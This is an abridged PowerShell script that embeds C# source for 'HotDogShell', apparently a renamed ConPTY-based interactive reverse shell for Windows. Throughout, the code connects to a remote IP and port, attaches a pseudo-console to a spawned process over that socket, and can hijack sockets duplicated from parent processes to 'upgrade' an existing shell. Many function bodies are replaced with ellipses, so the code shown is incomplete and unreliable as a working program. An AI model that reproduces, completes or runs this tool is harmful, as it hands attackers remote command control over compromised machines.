...
{   
    ...
    $parametersHotDogShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [HotDogShellMainClass]::HotDogShellMain($parametersHotDogShell)
    Write-Output $output
}
$Source = @"
using System;
...
public class HotDogShellException : Exception
{
    private const string error_string = "[-] HotDogShellException: ";
    public HotDogShellException() { }
    public HotDogShellException(string message) : base(error_string + message) { }
}
...
public static class SocketHijacking
{
    ...
    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        ...
        if (targetSocketHandle == IntPtr.Zero)
            throw new HotDogShellException("No sockets found, so no hijackable sockets :( Exiting...");
    ...
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        ...
        if (result == -1)
            throw new HotDogShellException("ioctlsocket failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
    }
}
[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    ...
    public static Process GetParentProcess(IntPtr handle)
    {
        ...
        if (status != 0)
            throw new HotDogShellException(status.ToString());
        try
        {
...
public static class HotDogShell
{
    private const string errorString = "{{{HotDogShellException}}}\r\n";
    ...
    private static void InitWSAThread()
    {
        ...
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new HotDogShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
    }
    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        ...
        {
            throw new HotDogShellException("Specified port is invalid: " + remotePort.ToString());
        }
        ...
        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            ...
            throw new HotDogShellException(String.Format("WSAConnect failed with error code: {0}", error));
        }
        return socket;
    }
    ...
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        ...
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new HotDogShellException("Could not create the InputPipe");
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new HotDogShellException("Could not create the OutputPipe");
    }
    ...
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        ...
        {
            throw new HotDogShellException("Could not get console mode");
        }
        outConsoleMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING | DISABLE_NEWLINE_AUTO_RETURN;
        if (!SetConsoleMode(hStdOut, outConsoleMode))
        {
            throw new HotDogShellException("Could not enable virtual terminal processing");
        }
    }
    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr HotDogInputPipeRead, ref IntPtr HotDogOutputPipeWrite, uint rows, uint cols)
    {
        int result = -1;
        ...
        result = CreatePseudoConsole(consoleCoord, HotDogInputPipeRead, HotDogOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        ...
        {
            throw new HotDogShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new HotDogShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
        }
        ...
        if (!success)
        {
            throw new HotDogShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
        }
        return startupInfo;
    }
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        ...
        if (!success)
        {
            throw new HotDogShellException("Could not create process. " + Marshal.GetLastWin32Error());
        }
        return pInfo;
    }
    ...
    public static string SpawnHotDogShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
    {
            ...
            if (upgradeShell)
            {
                ...
                if (shellSocket == IntPtr.Zero && parentProcess != null)
                {
                    ...
                    if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                    {
                        ...
                        {
                            throw new HotDogShellException("No \\Device\\Afd objects found. Socket duplication failed.");
                        }
                        else
                        {
        ...
        else
        {
            if (upgradeShell)
            {
                output += string.Format("Could not upgrade shell to fully interactive because HotDog is not compatible on this system");
                return output;
            }
            shellSocket = connectRemote(remoteIp, remotePort);
            if (shellSocket == IntPtr.Zero)
        ...
        output += "HotDogShell kindly exited.\r\n";
        return output;
    }
}
public static class HotDogShellMainClass
{
    ...
    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < 2)
            throw new HotDogShellException("\r\nHotDogShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
    }
    ...
    private static string CheckRemoteIpArg(string ipString)
    {
        ...
        if (!IPAddress.TryParse(ipString, out address))
            throw new HotDogShellException("\r\nHotDogShell: Invalid remoteIp value" + ipString);
        return ipString;
    }
    private static int CheckInt(string arg)
    {
        ...
        if (!Int32.TryParse(arg, out ret))
            throw new HotDogShellException("\r\nHotDogShell: Invalid integer value " + arg);
        return ret;
    }
    ...
    public static string HotDogShellMain(string[] args)
    {
        string output = "";
        ...
        else
        {
            ...
            try
            {
                ...
                output = HotDogShell.SpawnHotDogShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
...
class MainClass
{
    ...
    {
        Console.Out.Write(HotDogShellMainClass.HotDogShellMain(args));
    }
}
"@;
